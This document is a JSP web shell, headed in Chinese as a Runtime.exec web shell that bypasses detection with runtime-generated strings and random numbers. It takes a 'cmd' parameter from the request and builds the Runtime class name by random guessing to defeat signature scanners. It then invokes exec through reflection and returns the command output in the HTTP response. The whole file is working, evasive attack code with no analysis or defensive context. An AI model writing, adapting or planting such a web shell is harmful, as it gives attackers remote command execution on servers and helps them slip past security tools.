<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="sun.reflect.misc.MethodUtil" %>
<%@ page import="java.util.Random" %>
<html>
<body>
<h2>利用随机数运行时可知字符串绕过检测的Runtime.exec的JSP WebShell</h2>
<%
    String s2 = request.getParameter("cmd");
    Class rt;
    while (true) {
        try {
            rt = Class.forName("java.lang." + (new String(Character.toChars(new Random().nextInt(3) + 80))) + "untime");
            break;
        } catch (Throwable throwable) {}
    }
    Field currentRuntime = rt.getDeclaredFields()[0];
    currentRuntime.setAccessible(true);
    Object o = currentRuntime.get(null);
    Process process;
    while (true) {
        try {
            Method method = rt.getDeclaredMethods()[new Random().nextInt(20)];
            method.setAccessible(true);
            process = (Process) MethodUtil.invoke(method, o, new Object[]{s2.split(" ")});
            if (process ==  null)
                continue;
            break;
        } catch (Throwable throwable) {}
    }


    InputStream inputStream = process.getInputStream();
    StringBuilder stringBuilder = new StringBuilder();
    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
    String line;
    while((line = bufferedReader.readLine()) != null) {
        stringBuilder.append(line).append("\n");
    }
    if (stringBuilder.length() > 0) {
        response.getOutputStream().write(stringBuilder.toString().getBytes());
    }
%>
</body>
</html>